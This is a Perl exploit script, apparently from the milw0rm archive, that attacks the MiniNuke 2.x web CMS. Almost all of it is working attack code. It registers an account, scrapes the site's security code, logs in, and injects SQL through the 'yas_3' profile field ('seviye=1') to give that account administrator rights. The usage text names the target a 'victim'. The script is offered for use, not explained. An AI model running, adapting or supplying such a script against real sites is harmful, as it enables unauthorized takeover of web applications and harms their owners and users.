<html><head><title>MiniNuke 2.x (create an admin) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Original advisory: http://www.nukedx.com/?viewdoc=31
#Usage: mini.pl &lt;host&gt; &lt;path&gt; &lt;user&gt; &lt;pass&gt; &lt;mail&gt;
use IO::Socket;
if(@ARGV != 5) { usage(); }
else { exploit(); }
sub header()
{
  print &quot;\n- NukedX Security Advisory Nr.2006-31\r\n&quot;;
  print &quot;- MiniNuke v2.x Remote SQL Injection (create an admin) Exploit\r\n&quot;;
}
sub usage() 
{
  header();
  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt; &lt;user&gt; &lt;pass&gt; &lt;mail&gt;\r\n&quot;;
  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
  print &quot;- &lt;path&gt; -&gt; Path to MiniNuke ex: /mininuke/\r\n&quot;;
  print &quot;- &lt;user&gt; -&gt; Desired username to create ex: h4x0r\r\n&quot;;
  print &quot;- &lt;pass&gt; -&gt; Password for our username ex: p4ZZw0rd\r\n&quot;;
  print &quot;- &lt;mail&gt; -&gt; Mail for our username ex: hax0r\@s3x0r3d.com\r\n&quot;;
  exit();
}
sub exploit () 
{
  #Our variables...
  $mnserver = $ARGV[0];
  $mnserver =~ s/(http:\/\/)//eg;
  $mnhost   = &quot;http://&quot;.$mnserver;
  $mndir    = $ARGV[1];
  $mnuser   = $ARGV[2];
  $mnpass   = $ARGV[3];
  $mnmail   = $ARGV[4];
  $mnport   = &quot;80&quot;;
  #Sending data...
  header();
  print &quot;- Trying to connect: $mnserver\r\n&quot;;
  getsession();
}
sub getsession ()
{
  print &quot;- Getting session for register...\r\n&quot;;
  $mnstar   = &quot;membership.asp?action=new&quot;;
  $mnsreq   = $mnhost.$mndir.$mnstar;
  $mns = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$mnserver&quot;, PeerPort =&gt; &quot;$mnport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $mns &quot;GET $mnsreq HTTP/1.1\n&quot;;
  print $mns &quot;Accept: */*\n&quot;;
  print $mns &quot;Referer: $mnhost\n&quot;;
  print $mns &quot;Accept-Language: tr\n&quot;;
  print $mns &quot;User-Agent: NukeZilla\n&quot;;
  print $mns &quot;Cache-Control: no-cache\n&quot;;
  print $mns &quot;Host: $mnserver\n&quot;;
  print $mns &quot;Connection: close\n\n&quot;;
  print &quot;- Connected...\r\n&quot;;
  while ($answer = &lt;$mns&gt;) { 
    if ($answer =~ /Set-Cookie: (.*?) path=\//) { $mncookie = $mncookie.$1; }
    if ($answer =~ /Güvenlik Kodunuz&lt;\/td&gt;&lt;td width=\&quot;50%\&quot;&gt;&lt;b&gt;(.*?)&lt;\/b&gt;&lt;\/td&gt;/) { $mngvn=$1;doregister(); }
  }
  #if you are here...
  die &quot;- Exploit failed\r\n&quot;;
}
sub doregister ()
{
  close($mns);
  $mntar    = &quot;membership.asp?action=register&quot;;
  $mnreq    = $mnhost.$mndir.$mntar;
  print &quot;- Session getting done\r\n&quot;;
  print &quot;- Lets create our user...\r\n&quot;;
  $mndata = &quot;kuladi=&quot;.$mnuser;
  $mndata.= &quot;&amp;password=&quot;.$mnpass;
  $mndata.= &quot;&amp;email=&quot;.$mnmail;
  $mndata.= &quot;&amp;isim=h4x0r&quot;;
  $mndata.= &quot;&amp;g_soru=whooooo&quot;;
  $mndata.= &quot;&amp;g_cevap=h4x0rs&quot;;
  $mndata.= &quot;&amp;icq=1&quot;;
  $mndata.= &quot;&amp;msn=1&quot;;
  $mndata.= &quot;&amp;aim=1&quot;;
  $mndata.= &quot;&amp;sehir=1&quot;;
  $mndata.= &quot;&amp;meslek=1&quot;;
  $mndata.= &quot;&amp;cinsiyet=b&quot;;
  $mndata.= &quot;&amp;yas_1=1&quot;;
  $mndata.= &quot;&amp;yas_2=1&quot;;
  $mndata.= &quot;&amp;yas_3=1920&quot;;
  $mndata.= &quot;&amp;web=http://www.milw0rm.com&quot;;
  $mndata.= &quot;&amp;imza=h4x0r&quot;;
  $mndata.= &quot;&amp;mavatar=IMAGES/avatars/1.gif&quot;;
  $mndata.= &quot;&amp;security_code=&quot;.$mngvn;
  $mndata.= &quot;&amp;mail_goster=on&quot;;
  $mndatalen = length($mndata);
  $mn =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$mnserver&quot;, PeerPort =&gt; &quot;$mnport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $mn &quot;POST $mnreq HTTP/1.1\r\n&quot;;
  print $mn &quot;Accept: */*\r\n&quot;;
  print $mn &quot;Referer: $mnhost\r\n&quot;;
  print $mn &quot;Accept-Language: tr\r\n&quot;;
  print $mn &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  print $mn &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
  print $mn &quot;User-Agent: NukeZilla\r\n&quot;;
  print $mn &quot;Cookie: $mncookie\r\n&quot;;
  print $mn &quot;Host: $mnserver\r\n&quot;;
  print $mn &quot;Content-length: $mndatalen\r\n&quot;;
  print $mn &quot;Connection: Keep-Alive\r\n&quot;;
  print $mn &quot;Cache-Control: no-cache\r\n\r\n&quot;;
  print $mn $mndata;
  print $mn &quot;\r\n\r\n&quot;;
  while ($answer = &lt;$mn&gt;) { 
    if ($answer =~ /Tebrikler !!!/) { 
      print &quot;- Creating user has been done...\r\n&quot;; 
      print &quot;- Loginning in to user...\r\n&quot;;
      dologin();
    }
  }
  #if you are here...
  die &quot;- Exploit failed\r\n&quot;;
}
sub dologin ()
{
  close ($mn);
  $mnltar  = &quot;enter.asp&quot;;
  $mnlreq  = $mnhost.$mndir.$mnltar;
  $mnldata = &quot;kuladi=&quot;.$mnuser;
  $mnldata.= &quot;&amp;password=&quot;.$mnpass;
  $mnldata.= &quot;&amp;guvenlik=423412&quot;;
  $mnldata.= &quot;&amp;gguvenlik=423412&quot;;
  $mnldatalen = length($mnldata);
  $mnl =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$mnserver&quot;, PeerPort =&gt; &quot;$mnport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $mnl &quot;POST $mnlreq HTTP/1.1\r\n&quot;;
  print $mnl &quot;Accept: */*\r\n&quot;;
  print $mnl &quot;Referer: $mnhost\r\n&quot;;
  print $mnl &quot;Accept-Language: tr\r\n&quot;;
  print $mnl &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  print $mnl &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
  print $mnl &quot;User-Agent: NukeZilla\r\n&quot;;
  print $mnl &quot;Host: $mnserver\r\n&quot;;
  print $mnl &quot;Content-length: $mnldatalen\r\n&quot;;
  print $mnl &quot;Connection: Keep-Alive\r\n&quot;;
  print $mnl &quot;Cache-Control: no-cache\r\n\r\n&quot;;
  print $mnl $mnldata;
  print $mnl &quot;\r\n\r\n&quot;;
  while ($answer = &lt;$mnl&gt;) { 
    if ($answer =~ /Set-Cookie: (.*?) path=\//) { $mnlcookie = $mnlcookie.$1; }
    if ($answer =~ /Cache-control:/) { doadmin(); }
   }
  #if you are here...
  die &quot;- Exploit failed\r\n&quot;;
}
sub doadmin ()
{
  close($mnl);
  print &quot;- Editing profile..\r\n&quot;;
  $mnptar  = &quot;Your_Account.asp?op=UpdateProfile&quot;;
  $mnpreq  = $mnhost.$mndir.$mnptar;
  $mnpdata.= &quot;email=&quot;.$mnmail;
  $mnpdata.= &quot;&amp;isim=h4x0r&quot;;
  $mnpdata.= &quot;&amp;g_soru=whooooo&quot;;
  $mnpdata.= &quot;&amp;g_cevap=h4x0rs&quot;;
  $mnpdata.= &quot;&amp;icq=1&quot;;
  $mnpdata.= &quot;&amp;msn=1&quot;;
  $mnpdata.= &quot;&amp;aim=1&quot;;
  $mnpdata.= &quot;&amp;sehir=1&quot;;
  $mnpdata.= &quot;&amp;meslek=1&quot;;
  $mnpdata.= &quot;&amp;cinsiyet=b&quot;;
  $mnpdata.= &quot;&amp;yas_1=1&quot;;
  $mnpdata.= &quot;&amp;yas_2=1&quot;;
  $mnpdata.= &quot;&amp;yas_3=1920',seviye='1&quot;;
  $mnpdata.= &quot;&amp;web=http://www.milw0rm.com&quot;;
  $mnpdata.= &quot;&amp;imza=h4x0r&quot;;
  $mnpdata.= &quot;&amp;mavatar=IMAGES/avatars/1.gif&quot;;
  $mnpdata.= &quot;&amp;mail_goster=on&quot;;
  $mnpdatalen = length($mnpdata);
  $mnp =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$mnserver&quot;, PeerPort =&gt; &quot;$mnport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $mnp &quot;POST $mnpreq HTTP/1.1\r\n&quot;;
  print $mnp &quot;Accept: */*\r\n&quot;;
  print $mnp &quot;Referer: $mnhost\r\n&quot;;
  print $mnp &quot;Accept-Language: tr\r\n&quot;;
  print $mnp &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  print $mnp &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
  print $mnp &quot;User-Agent: NukeZilla\r\n&quot;;
  print $mnp &quot;Cookie: $mnlcookie\r\n&quot;;
  print $mnp &quot;Host: $mnserver\r\n&quot;;
  print $mnp &quot;Content-length: $mnpdatalen\r\n&quot;;
  print $mnp &quot;Connection: Keep-Alive\r\n&quot;;
  print $mnp &quot;Cache-Control: no-cache\r\n\r\n&quot;;
  print $mnp $mnpdata;
  print $mn &quot;\r\n\r\n&quot;;
  while ($answer = &lt;$mnp&gt;) { 
    if ($answer =~ /Tebrikler !!!/) { 
      print &quot;- Editing profile been done...\r\n&quot;; 
      print &quot;- Exploiting finished succesfully\r\n&quot;;
      print &quot;- Your username $mnuser has been created as admin\r\n&quot;;
      print &quot;- You can login with password $mnpass on $mnlreq\r\n&quot;;
      exit();
    }
    if ($answer =~ /Üyeler Açýktýr/) { 
      print &quot;- Exploit failed\r\n&quot;;
      exit();
    }
  }
  #if you are here...
  die &quot;- Exploit failed\r\n&quot;;
}
# nukedx.com [2006-05-27]

# milw0rm.com [2006-05-27]</pre></html>